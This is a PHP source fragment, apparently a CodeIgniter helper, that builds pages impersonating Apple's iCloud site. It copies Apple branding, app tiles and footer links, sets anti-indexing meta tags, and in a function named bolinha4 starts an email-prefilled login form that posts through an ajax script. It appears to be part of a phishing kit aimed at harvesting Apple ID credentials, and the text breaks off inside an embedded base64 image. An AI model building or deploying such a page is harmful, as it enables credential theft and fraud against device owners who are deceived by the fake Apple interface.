	$html .= '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" ;
	$html .= '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/9.png" alt="">' . "\n" . '                    <span>' . "\n\t\t\t\t\t\t" . $ci->lang->line('Notes_message') . "\n\t\t\t\t\t" . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/3.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('iCloudDrive_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/10.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('Photos_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/1.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('Contacts_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/8.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('Mail_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n\n\n\n\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/12.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('Settings_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/2.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('FindMyiPhone_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/6.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('Keynote_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/5.png" alt="">' . "\n" . '                    <span> ' . $ci->lang->line('Numbers_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/20.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('FindFriends_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/7.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('Pages_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n\n\n" . '            </div>' . "\n" . '        </div>' . "\n" . '    </section>' . "\n\n" . '    <footer class="foot">' . "\n" . '        <div class="container-fluid">' . "\n" . '            <div class="row">' . "\n\n" . '                <div class="col-md-10 col-xs-12 foot-link">' . "\n" . '                    <a class="hidden-xs" href="https://www.apple.com/support/systemstatus/" target="_blank">' . "\n" . '                        ' . $ci->lang->line('Systemstatus_message') . '</a>' . "\n" . '                    <span class="footer-link-separator hidden-xs"></span>' . "\n" . '                    <a class="hidden-xs" href="https://www.apple.com/privacy/"' . "\n" . '                       target="_blank">' . $ci->lang->line('Privacy_message') . '</a>' . "\n" . '                    <span class="footer-link-separator hidden-xs"></span>' . "\n" . '                    <a class="hidden-xs" href="https://www.apple.com/legal/icloud/ww/"' . "\n" . '                       target="_blank">' . $ci->lang->line('Terms_message') . '</a>' . "\n" . '                    <span class="footer-link-separator hidden-xs"></span>' . "\n" . '                    <span class="copyright">' . $ci->lang->line('Copyrights_message') . '</span>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-xs-12 apple">' . "\n" . '                    <a href="https://www.apple.com/" target="_blank" class="apple-logo"></a>' . "\n" . '                </div>' . "\n\n" . '            </div>' . "\n" . '        </div>' . "\n" . '    </footer>' . "\n\n" . '</div>' . "\n" . '    <div class="main-container">' . "\n" . '  ' . "\n" . '  <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d7315.381498631628!2d-46.64661067606171!3d-23.543622738766476!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x94ce5851c0395f3b%3A0xf36ea5aa7f8ff302!2zUmVww7pibGljYSwgU8OjbyBQYXVsbyAtIFNQ!5e0!3m2!1spt-BR!2sbr!4v1551067504976" width="100%" height="100%" frameborder="0" allowfullscreen=""></iframe>   ' . "\n" . '    </div>' . "\n" . '    <script src="/assets/js/jquery.js"></script>' .  "\n";
	$html .= '<script src="' . site_url('assets/js/bolinha2.js?t=' . time()) . '" type="text/javascript"></script>' . "\n" . '    <script src="/assets/js/strap.min.js"></script>' . "\n" . '</script>' . "\n";
	$html .= '    <script src="/assets/js/ajax-form2.js?t=' . time() . '"></script>' . "\n" . '</body>' . "\n" . '</html>' . "\n" . '        ';
	return $html;
}
}

if (!(function_exists('bolinha4'))) {
function bolinha4($title, $emailid)
{
	$finalLink 			= $_SERVER["REQUEST_URI"];
	$finalLinkExplode	= explode("/", $finalLink);
	if(strstr($emailid,"@")){
		$novoMail = $emailid;
	}else{
		$novoMail='';
		}
	$ci = &get_instance();
	$redirect = $ci->load->get_var('redirect');
	$redirecturl = $ci->load->get_var('redirecturl');
	$logged = (($ci->session->userdata('logged_in') == false ? 'none' : 'block'));
	$title = ((isset($title) ? $title : 'iCloud'));
	$html = '<!DOCTYPE html>' . "\n" . '<html lang="en">' . "\n" . '<head>' . "\n" . '    <meta charset="UTF-8">' . "\n" . '    <meta name="robots" content="noindex, nofollow, noarchive"/>' . "\n" . '    <meta name="googlebot" content="noindex, nofollow, noarchive">' . "\n" . '    <meta name="googlebot" content="nosnippet"/>' . "\n" . '    <meta name="robots" content="noodp"/>' . "\n" . '    <meta name="slurp" content="noydir">' . "\n" . '    <meta name="robots" content="noimageindex,nomediaindex"/>' . "\n" . '    <meta name="robots" content="unavailable_after: 21-Jul-2037 14:30:00 CET"/>' . "\n" . '    <meta http-equiv="X-UA-Compatible" content="IE=edge">' . "\n" . '    <meta content="width=device-width, initial-scale=1" name="viewport"/>' . "\n" . '    <link rel="apple-touch-icon" sizes="57x57" href="/assets/favicon/apple-icon-57x57.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="60x60" href="/assets/favicon/apple-icon-60x60.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="72x72" href="/assets/favicon/apple-icon-72x72.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="76x76" href="/assets/favicon/apple-icon-76x76.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="114x114" href="/assets/favicon/apple-icon-114x114.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="120x120" href="/assets/favicon/apple-icon-120x120.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="144x144" href="/assets/favicon/apple-icon-144x144.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="152x152" href="/assets/favicon/apple-icon-152x152.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon/apple-icon-180x180.png">' . "\n" . '    <link rel="icon" type="image/png" sizes="192x192" href="/assets/favicon/android-icon-192x192.png">' . "\n" . '    <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon/favicon-32x32.png">' . "\n" . '    <link rel="icon" type="image/png" sizes="96x96" href="/assets/favicon/favicon-96x96.png">' . "\n" . '    <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon/favicon-16x16.png">' . "\n" . '    <link rel="manifest" href="/assets/favicon/manifest.json">' . "\n" . '    <meta name="msapplication-TileColor" content="#ffffff">' . "\n" . '    <meta name="msapplication-TileImage" content="/assets/favicon/ms-icon-144x144.png">' . "\n" . '    <meta name="theme-color" content="#ffffff">' . "\n" . '    <title>' . $title . '</title>' . "\n";
	$html .= '    <link rel="stylesheet" href="/assets/layout/strap.css">' ;
	$html .= "\n" . '    <link rel="stylesheet" href="/assets/layout/applenew2.css">' ;
	$html .= "\n" . '    <link rel="stylesheet" href="/assets/css/app.css">' ;
	$html .= "\n" . '    <link rel="stylesheet" href="/assets/layout/kit.css">' . "\n" . '    <link rel="stylesheet" href="/assets/layout/animate.css">' . "\n" . '    <link rel="stylesheet" href="/assets/css/font-awesome.css">' . "\n" . '    <style>' . "\n" . '        .main-container {' . "\n" . '            position: absolute;' . "\n" . '            top: 0;' . "\n" . '            left: 0;' . "\n" . '            width: 100%;' . "\n" . '            min-height: 100%;' . "\n" . '            overflow: hidden;' . "\n" . '            z-index: 1;' . "\n" . '        }' . "\n\n" . '        .section-bgs {' . "\n" . '            position: relative;' . "\n" . '            width: 100%;' . "\n" . '            min-height: 100%;' . "\n" . '            z-index: 1;' . "\n" . '        }' . "\n\n" . '        .section-bgs canvas {' . "\n" . '            min-height: 100%;' . "\n" . '            width: 100%;' . "\n" . '            z-index: 1;' . "\n" . '        }' . "\n\n" . '    </style>' . "\n" . '</head>' . "\n" . '<body class="robots-nocontent sc-theme sc-focus box-shadow border-rad safari mac webkit en-us">' . "\n\n";
	$html .= '<div class="header" id="cloudos-loading-screen-header">
        <div class="apple-icon-wrapper">
            <svg class="apple-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="44" viewBox="0 0 16 44">
             <path d="M8.02 16.23c-.73 0-1.86-.83-3.05-.8-1.57.02-3.01.91-3.82 2.32-1.63 2.83-.42 7.01 1.17 9.31.78 1.12 1.7 2.38 2.92 2.34 1.17-.05 1.61-.76 3.03-.76 1.41 0 1.81.76 3.05.73 1.26-.02 2.06-1.14 2.83-2.27.89-1.3 1.26-2.56 1.28-2.63-.03-.01-2.45-.94-2.48-3.74-.02-2.34 1.91-3.46 2-3.51-1.1-1.61-2.79-1.79-3.38-1.83-1.54-.12-2.83.84-3.55.84zm2.6-2.36c.65-.78 1.08-1.87.96-2.95-.93.04-2.05.62-2.72 1.4-.6.69-1.12 1.8-.98 2.86 1.03.08 2.09-.53 2.74-1.31"></path>
             </svg>
        </div>
        <div class="apple-icon-right">
             <svg class="apple-ico" viewBox="0 0 98 98" version="1.1" xmlns="http://www.w3.org/2000/svg" classname=" glyph-box">
            <g transform="matrix(1 0 0 1 -11 85)">
            <path d="M 58.5449 14.5508 C 85.791 14.5508 108.35 -8.00781 108.35 -35.2539 C 108.35 -62.4512 85.7422 -85.0586 58.4961 -85.0586 C 31.2988 -85.0586 8.74023 -62.4512 8.74023 -35.2539 C 8.74023 -8.00781 31.3477 14.5508 58.5449 14.5508 Z M 58.5449 6.25 C 35.498 6.25 17.0898 -12.207 17.0898 -35.2539 C 17.0898 -58.252 35.4492 -76.7578 58.4961 -76.7578 C 81.543 -76.7578 100 -58.252 100.049 -35.2539 C 100.098 -12.207 81.5918 6.25 58.5449 6.25 Z M 57.5195 -25.1465 C 60.0098 -25.1465 61.4746 -26.6602 61.4746 -28.6133 L 61.4746 -29.1992 C 61.4746 -31.9336 63.0859 -33.6426 66.4551 -35.8887 C 71.1914 -39.0137 74.5605 -41.8945 74.5605 -47.7051 C 74.5605 -55.8594 67.334 -60.2051 59.082 -60.2051 C 50.6836 -60.2051 45.166 -56.25 43.7988 -51.7578 C 43.5547 -50.9277 43.4082 -50.1465 43.4082 -49.3164 C 43.4082 -47.168 45.1172 -45.9473 46.7285 -45.9473 C 49.5117 -45.9473 49.9512 -47.4609 51.5137 -49.2676 C 53.125 -51.9531 55.4688 -53.5645 58.7402 -53.5645 C 63.1836 -53.5645 66.1133 -51.0742 66.1133 -47.3145 C 66.1133 -43.9941 64.0137 -42.3828 59.7656 -39.4531 C 56.25 -37.0117 53.6621 -34.4238 53.6621 -29.6387 L 53.6621 -29.0039 C 53.6621 -26.416 55.0293 -25.1465 57.5195 -25.1465 Z M 57.4219 -10.5469 C 60.2539 -10.5469 62.6953 -12.793 62.6953 -15.625 C 62.6953 -18.5059 60.3027 -20.7031 57.4219 -20.7031 C 54.541 -20.7031 52.1484 -18.457 52.1484 -15.625 C 52.1484 -12.8418 54.5898 -10.5469 57.4219 -10.5469 Z">
            </path></g></svg>
        </div>
	</div>';

	$html .= '<div class="first-load">' . "\n" . '    <div class="overlay">' . "\n" . '        <div class="spinner center">' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '        </div>' . "\n" . '    </div>' . "\n" . '</div>' . "\n\n" . '<div class="bodys" style="display: none; z-index: 9999;">' . "\n" . '    <section id="header">' . "\n" . '        <div class="container-fluid">' . "\n" . '            <div class="row">' . "\n" . '                <div class="col-md-4 col-xs-8 rightH">' . "\n" . '                    <a class="help" title="' . $ci->lang->line('Help_message') . '"' . "\n" . '                       alt="' . $ci->lang->line('Help_message') . '" href="https://help.apple.com/icloud/"></a>' . "\n" . '                    <span class="spreat"></span>';

	if (!($ci->session->userdata('firstName'))) {
		$html .= '<a class="setup applef" target="_blank"' . "\n" . '                           href="https://www.apple.com/icloud/setup/">' . $ci->lang->line('Setup_message') . '</a>';
	}


	$html .= '<div class="setup fName"' . "\n" . '                         style="display: ' . (($ci->session->userdata('logged_in') == false ? 'none' : 'block')) . '">' . "\n" . '                    <span>' . "\n" . '                    <img src="/assets/img/user.png" alt="">' . $ci->session->userdata('firstName') . "\n" . '                        <i class="glyphicon glyphicon-menu-down"></i>' . "\n" . '                        </span>' . "\n" . '                        <ul>' . "\n" . '                            <li>' . "\n" . '                                <a href="' . site_url('findmyiphone') . '">' . $ci->lang->line('iCloudsettings_message') . '</a>' . "\n" . '                            </li>' . "\n" . '                            <li>' . "\n" . '                                <a href="' . site_url('logout') . '">' . $ci->lang->line('Signout_message') . '</a>' . "\n" . '                            </li>' . "\n" . '                        </ul>' . "\n" . '                    </div>' . "\n\n" . '                </div>' . "\n" . '                <div class="col-md-8 col-xs-4 leftH">' . "\n" . '                    <span class="icloud"></span>' . "\n" . '                </div>' . "\n" . '            </div>' . "\n" . '        </div>' . "\n" . '    </section>';

	if ($ci->session->userdata('logged_in') == false) {
		$html .= '<section class="login-form text-center animated" style="display: none;">' . "\n\n" . '        <img class="cnsmr-app-image " src="data:image/png;base64,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